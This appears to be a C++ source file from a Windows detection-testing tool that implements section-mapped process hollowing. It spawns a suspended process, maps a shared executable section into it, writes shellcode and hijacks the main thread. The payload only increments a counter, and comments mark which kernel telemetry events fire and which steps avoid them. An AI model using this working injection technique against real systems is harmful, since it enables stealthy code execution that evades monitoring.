#include "SectionInjection.h"

#include <winternl.h>
#include <cstring>
#include <vector>

namespace PT::SectionInjection {

	// Module-scope storage for the last install's victim handles. The CLI
	// path calls install() → verify → cleanup() sequentially so a single
	// slot is sufficient; a library-style caller would take & return an
	// RAII wrapper instead. Kept in the API namespace (not the anonymous
	// one) so cleanup() can access them without cross-anonymous-namespace
	// gymnastics.
	HANDLE last_victim_process_handle = nullptr;
	HANDLE last_victim_thread_handle  = nullptr;

	namespace {

		// ---------------------------------------------------------------------
		// Undocumented ntdll prototypes needed for section-mapped hollowing.
		// winternl.h ships some of these but with incomplete signatures; we
		// redeclare with the full form so the calls type-check without
		// #ifdef gymnastics around WDK vs SDK builds.
		// ---------------------------------------------------------------------

		typedef NTSTATUS (NTAPI *Fn_NtCreateSection)(
			PHANDLE            SectionHandle,
			ACCESS_MASK        DesiredAccess,
			POBJECT_ATTRIBUTES ObjectAttributes,   // NULL → unnamed
			PLARGE_INTEGER     MaximumSize,
			ULONG              SectionPageProtection,
			ULONG              AllocationAttributes,
			HANDLE             FileHandle           // NULL → pagefile-backed
		);

		// SECTION_INHERIT is defined in winternl.h but we spell out the value.
		enum { VIEW_UNMAP = 2 };  // ViewUnmap — child processes don't inherit the view

		typedef NTSTATUS (NTAPI *Fn_NtMapViewOfSection)(
			HANDLE           SectionHandle,
			HANDLE           ProcessHandle,
			PVOID            *BaseAddress,
			ULONG_PTR        ZeroBits,
			SIZE_T           CommitSize,
			PLARGE_INTEGER   SectionOffset,
			PSIZE_T          ViewSize,
			DWORD            InheritDisposition,   // SECTION_INHERIT
			ULONG            AllocationType,
			ULONG            Win32Protect
		);

		typedef NTSTATUS (NTAPI *Fn_NtUnmapViewOfSection)(
			HANDLE ProcessHandle,
			PVOID  BaseAddress
		);

		// One-time resolver — grabs ntdll addresses on first use. Cached in
		// function-local statics so the resolution happens exactly once per
		// process lifetime, thread-safely (magic-static init in C++11+).
		struct NtApis {
			Fn_NtCreateSection      NtCreateSection      = nullptr;
			Fn_NtMapViewOfSection   NtMapViewOfSection   = nullptr;
			Fn_NtUnmapViewOfSection NtUnmapViewOfSection = nullptr;
			bool ok = false;
		};

		const NtApis& nt_apis() {
			static NtApis apis = []() {
				NtApis a{};
				HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
				if (!ntdll) return a;
				a.NtCreateSection = reinterpret_cast<Fn_NtCreateSection>(
					GetProcAddress(ntdll, "NtCreateSection"));
				a.NtMapViewOfSection = reinterpret_cast<Fn_NtMapViewOfSection>(
					GetProcAddress(ntdll, "NtMapViewOfSection"));
				a.NtUnmapViewOfSection = reinterpret_cast<Fn_NtUnmapViewOfSection>(
					GetProcAddress(ntdll, "NtUnmapViewOfSection"));
				a.ok = (a.NtCreateSection && a.NtMapViewOfSection && a.NtUnmapViewOfSection);
				return a;
			}();
			return apis;
		}

		// ---------------------------------------------------------------------
		// Payload layout in the shared section (4KB, RWX):
		//
		//   Offset  0x0000 : uint64_t hit_counter   (initialized to 0)
		//   Offset  0x0010 : shellcode entry
		//
		// x64 shellcode (10 bytes):
		//   F0 48 FF 05 <disp32>   lock inc qword ptr [rip + disp32]   (8 bytes)
		//   EB FE                  jmp $                               (2 bytes)
		//
		// RIP-relative disp32 semantics: after the `lock inc` instruction (8
		// bytes) executes, RIP == shellcode_addr + 8. The counter sits at
		// section_base + 0. So the displacement is (counter_addr) - (rip_after)
		// = (section_base + 0) - (section_base + shellcode_offset + 8)
		// = -(shellcode_offset + 8).
		//
		// With shellcode_offset = 0x10, disp32 = -(0x18) = 0xFFFFFFE8 (little-
		// endian bytes E8 FF FF FF).
		//
		// This works regardless of where the section is mapped in either
		// process — RIP-relative addressing is location-independent.
		//
		// The `jmp $` (EB FE) puts the victim thread into an infinite loop
		// after the increment. Attacker terminates the victim after
		// verification. This avoids the alternative — trying to return
		// cleanly from an APC-like execution context, which is fiddly on
		// x64 without knowing the caller's return address.
		// ---------------------------------------------------------------------
		constexpr std::size_t SECTION_SIZE     = 4096;
		constexpr std::size_t COUNTER_OFFSET   = 0;
		constexpr std::size_t SHELLCODE_OFFSET = 0x10;

#ifdef _WIN64
		std::vector<std::uint8_t> build_shellcode() {
			// disp32 = -(shellcode_offset + 8) = -0x18 = 0xFFFFFFE8
			const std::int32_t disp32 =
				-static_cast<std::int32_t>(SHELLCODE_OFFSET + 8);
			std::vector<std::uint8_t> code = {
				0xF0, 0x48, 0xFF, 0x05,             // lock inc qword ptr [rip + disp32]
				0, 0, 0, 0,                         // disp32 placeholder
				0xEB, 0xFE,                         // jmp $
			};
			std::memcpy(code.data() + 4, &disp32, sizeof(disp32));
			return code;
		}
#else
		// x86 shellcode (8 bytes):
		//   F0 FF 05 <abs32>   lock inc dword ptr [counter_abs]   (7 bytes)
		//   EB FE              jmp $                              (2 bytes)
		//
		// x86 has no RIP-relative addressing, so we bake the ABSOLUTE address
		// of the counter into the instruction. That address is
		// victim_view_base + COUNTER_OFFSET — but victim_view_base is only
		// known AFTER we map into the victim. So on x86 we can't build the
		// shellcode until we know the remote address; the caller must pass
		// the resolved counter address at shellcode-build time.
		std::vector<std::uint8_t> build_shellcode_x86(std::uint32_t counter_abs_in_victim) {
			std::vector<std::uint8_t> code = {
				0xF0, 0xFF, 0x05,                   // lock inc dword ptr [abs32]
				0, 0, 0, 0,                         // abs32 placeholder
				0xEB, 0xFE,                         // jmp $
			};
			std::memcpy(code.data() + 3, &counter_abs_in_victim, sizeof(counter_abs_in_victim));
			return code;
		}
#endif

	}  // anonymous namespace

	std::optional<SectionHollowOutcome> install_section_mapped_hollowing(
		const std::wstring& victim_exe_path)
	{
		const auto& nt = nt_apis();
		if (!nt.ok) {
			std::fprintf(stderr,
				"[section-hollow] ntdll import resolution failed (missing NtCreateSection/NtMapViewOfSection/NtUnmapViewOfSection)\n");
			return std::nullopt;
		}

		// ---- 1. Create the victim process in CREATE_SUSPENDED --------------
		STARTUPINFOW si{};
		si.cb = sizeof(si);
		PROCESS_INFORMATION pi{};

		// CreateProcessW mutates its 2nd argument (the command-line buffer)
		// in some code paths, so copy the path into a mutable buffer.
		std::wstring cmdline(victim_exe_path);
		if (!CreateProcessW(
				nullptr,
				cmdline.data(),
				nullptr, nullptr,
				FALSE,
				CREATE_SUSPENDED,
				nullptr, nullptr,
				&si, &pi))
		{
			std::fprintf(stderr,
				"[section-hollow] CreateProcessW failed: err=%lu path='%ls'\n",
				GetLastError(), victim_exe_path.c_str());
			return std::nullopt;
		}

		// ---- 2. Create a shared section (pagefile-backed, RWX) -------------
		HANDLE section = nullptr;
		LARGE_INTEGER max_size{};
		max_size.QuadPart = SECTION_SIZE;
		NTSTATUS st = nt.NtCreateSection(
			&section,
			SECTION_ALL_ACCESS,
			nullptr,
			&max_size,
			PAGE_EXECUTE_READWRITE,
			SEC_COMMIT,
			nullptr);
		if (!NT_SUCCESS(st) || section == nullptr) {
			std::fprintf(stderr,
				"[section-hollow] NtCreateSection failed: NTSTATUS=0x%08lX\n",
				static_cast<unsigned long>(st));
			TerminateProcess(pi.hProcess, 1);
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
			return std::nullopt;
		}

		// ---- 3. Map into ATTACKER's own address space (local RW view) ------
		PVOID  local_base = nullptr;
		SIZE_T local_size = SECTION_SIZE;
		st = nt.NtMapViewOfSection(
			section, GetCurrentProcess(),
			&local_base, 0, SECTION_SIZE,
			nullptr, &local_size,
			VIEW_UNMAP, 0,
			PAGE_READWRITE);
		if (!NT_SUCCESS(st)) {
			std::fprintf(stderr,
				"[section-hollow] NtMapViewOfSection (local view) failed: NTSTATUS=0x%08lX\n",
				static_cast<unsigned long>(st));
			CloseHandle(section);
			TerminateProcess(pi.hProcess, 1);
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
			return std::nullopt;
		}

		// ---- 4. Map into VICTIM's address space (remote RWX view) ---------
		//    THIS is the operation that fires KERNEL_THREATINT_TASK_MAPVIEW
		//    cross-process. Everything before is invisible to ETW-TI.
		PVOID  remote_base = nullptr;
		SIZE_T remote_size = SECTION_SIZE;
		st = nt.NtMapViewOfSection(
			section, pi.hProcess,
			&remote_base, 0, SECTION_SIZE,
			nullptr, &remote_size,
			VIEW_UNMAP, 0,
			PAGE_EXECUTE_READWRITE);
		if (!NT_SUCCESS(st)) {
			std::fprintf(stderr,
				"[section-hollow] NtMapViewOfSection (remote view into victim) failed: NTSTATUS=0x%08lX\n",
				static_cast<unsigned long>(st));
			nt.NtUnmapViewOfSection(GetCurrentProcess(), local_base);
			CloseHandle(section);
			TerminateProcess(pi.hProcess, 1);
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
			return std::nullopt;
		}

		// ---- 5. Write shellcode + counter into our local view (LOCAL) ------
		//    Attacker writes to its OWN mapped view; the shared physical pages
		//    make the writes visible to the victim's remote view. No cross-
		//    process WRITEVM event fires.
		std::uint8_t* buf = reinterpret_cast<std::uint8_t*>(local_base);
		std::memset(buf, 0, SECTION_SIZE);   // zero-init (counter starts at 0)

#ifdef _WIN64
		const auto shellcode = build_shellcode();
#else
		// x86: bake in the absolute address of the counter as it appears in
		// the VICTIM's address space (remote_base + COUNTER_OFFSET).
		const auto shellcode = build_shellcode_x86(
			static_cast<std::uint32_t>(reinterpret_cast<std::uintptr_t>(remote_base) + COUNTER_OFFSET));
#endif
		std::memcpy(buf + SHELLCODE_OFFSET, shellcode.data(), shellcode.size());

		// ---- 6. Redirect the victim's main thread to our shellcode ---------
		//    fires KERNEL_THREATINT_TASK_SETTHREADCONTEXT cross-process.
		CONTEXT ctx{};
		ctx.ContextFlags = CONTEXT_FULL;
		if (!GetThreadContext(pi.hThread, &ctx)) {
			std::fprintf(stderr, "[section-hollow] GetThreadContext failed: err=%lu\n", GetLastError());
			nt.NtUnmapViewOfSection(pi.hProcess,           remote_base);
			nt.NtUnmapViewOfSection(GetCurrentProcess(),   local_base);
			CloseHandle(section);
			TerminateProcess(pi.hProcess, 1);
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
			return std::nullopt;
		}
#ifdef _WIN64
		ctx.Rip = reinterpret_cast<DWORD64>(remote_base) + SHELLCODE_OFFSET;
#else
		ctx.Eip = reinterpret_cast<DWORD>(remote_base) + SHELLCODE_OFFSET;
#endif
		if (!SetThreadContext(pi.hThread, &ctx)) {
			std::fprintf(stderr, "[section-hollow] SetThreadContext failed: err=%lu\n", GetLastError());
			nt.NtUnmapViewOfSection(pi.hProcess,           remote_base);
			nt.NtUnmapViewOfSection(GetCurrentProcess(),   local_base);
			CloseHandle(section);
			TerminateProcess(pi.hProcess, 1);
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
			return std::nullopt;
		}

		// ---- 7. Resume — shellcode starts running -------------------------
		if (ResumeThread(pi.hThread) == static_cast<DWORD>(-1)) {
			std::fprintf(stderr, "[section-hollow] ResumeThread failed: err=%lu\n", GetLastError());
			nt.NtUnmapViewOfSection(pi.hProcess,           remote_base);
			nt.NtUnmapViewOfSection(GetCurrentProcess(),   local_base);
			CloseHandle(section);
			TerminateProcess(pi.hProcess, 1);
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
			return std::nullopt;
		}

		// The section handle itself can be closed now — the views persist
		// until unmapped. Attacker retains the local view for verification;
		// victim retains its remote view for execution.
		CloseHandle(section);

		// The victim process/thread handles stay live so `cleanup()` can
		// terminate them post-verification.
		SectionHollowOutcome outcome{
			.victim_pid       = pi.dwProcessId,
			.victim_thread_id = pi.dwThreadId,
			.local_view_base  = reinterpret_cast<std::uintptr_t>(local_base),
			.remote_view_base = reinterpret_cast<std::uintptr_t>(remote_base),
			.section_size     = SECTION_SIZE,
			.counter_offset   = COUNTER_OFFSET,
			.shellcode_offset = SHELLCODE_OFFSET,
		};

		// Publish the victim handles for the CLI-level cleanup helper. We
		// don't return them in the outcome struct so the struct stays POD;
		// the caller sequences install() → verify → cleanup() so the module-
		// level statics are single-shot.
		last_victim_process_handle = pi.hProcess;
		last_victim_thread_handle  = pi.hThread;

		return outcome;
	}

	std::uint64_t read_hit_counter_local(std::uintptr_t local_view_base) {
		if (local_view_base == 0) return 0;
		std::uint64_t counter = 0;
		std::memcpy(&counter,
					reinterpret_cast<const void*>(local_view_base + COUNTER_OFFSET),
					sizeof(counter));
		return counter;
	}

	HANDLE take_last_victim_process_handle() {
		HANDLE h = last_victim_process_handle;
		last_victim_process_handle = nullptr;
		return h;
	}

	HANDLE take_last_victim_thread_handle() {
		HANDLE h = last_victim_thread_handle;
		last_victim_thread_handle = nullptr;
		return h;
	}

	void cleanup(const SectionHollowOutcome& outcome, HANDLE victim_process, HANDLE victim_thread) {
		// Unmap local view (attacker side) — releases our mapping. The victim
		// side unmaps automatically at process termination.
		const auto& nt = nt_apis();
		if (nt.ok && outcome.local_view_base != 0) {
			nt.NtUnmapViewOfSection(GetCurrentProcess(),
									reinterpret_cast<PVOID>(outcome.local_view_base));
		}
		// Kill the victim (which is currently spinning in `jmp $`).
		if (victim_process) {
			TerminateProcess(victim_process, 0);
			CloseHandle(victim_process);
		}
		if (victim_thread) {
			CloseHandle(victim_thread);
		}
	}

}  // namespace PT::SectionInjection
